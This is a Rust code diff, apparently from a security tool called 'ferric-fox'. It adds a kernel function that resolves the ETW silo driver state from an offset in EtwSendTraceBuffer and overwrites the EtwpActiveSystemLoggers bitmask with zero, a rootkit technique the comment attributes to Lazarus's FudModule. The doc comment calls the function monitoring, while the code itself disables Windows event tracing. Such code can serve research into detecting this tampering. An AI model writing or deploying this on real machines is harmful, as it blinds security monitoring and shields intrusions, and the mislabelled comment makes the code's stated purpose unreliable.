@@ -254,3 +254,53 @@ struct ListEntry {
     flink: *const c_void,
     blink: *const c_void,
 }
+
+/// Monitor the system logger bitmask as observed to be exploited by Lazarus in their FudModule rootkit.
+///
+/// This function monitors abuse of teh _ETW_SILODRIVERSTATE.SystemLoggerSettings.EtwpActiveSystemLoggers bitmask.
+pub fn clear_system_logger_bitmask() {
+    let address = resolve_relative_symbol_offset("EtwSendTraceBuffer", 78)
+        .expect("[ferric-fox] [-] Unable to resolve function EtwSendTraceBuffer")
+        as *const *const EtwSiloDriverState;
+
+    if address.is_null() {
+        println!("[ferric-fox] [-] Pointer to EtwSiloDriverState is null");
+        return;
+    }
+
+    // SAFETY: Null pointer checked above
+    if unsafe {*address}.is_null() {
+        println!("[ferric-fox] [-] Address for EtwSiloDriverState is null");
+        return;
+    } 
+    
+    // Calculate the offset in memory to the bitmask so we can disable it.
+    let logger_offset = size_of::<EtwSiloDriverState>();
+
+    // SAFETY: Null pointer checked above
+    let address_of_silo_driver_state_struct = unsafe { *address } as usize;
+    let logger_addr = address_of_silo_driver_state_struct + logger_offset - size_of::<u32>();
+    let addr = logger_addr as *mut u32;
+    
+    // SAFETY: Pointer is valid based off of calculations
+    unsafe { core::ptr::write(addr, 0) };
+
+    println!("[ferric-fox] [+] Successfully patched EtwpActiveSystemLoggers to 0");
+
+    
+}
+
+/// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_SILODRIVERSTATE
+#[repr(C)]
+struct EtwSiloDriverState {
+    unused: [u8; 0x1087],
+    settings: EtwSystemLoggerSettings,
+}
+
+/// https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_ETW_SYSTEM_LOGGER_SETTINGS
+#[repr(C)]
+#[derive(Debug)]
+struct EtwSystemLoggerSettings {
+    unused: [u8; 0xf],
+    active_system_loggers: u32,
+}
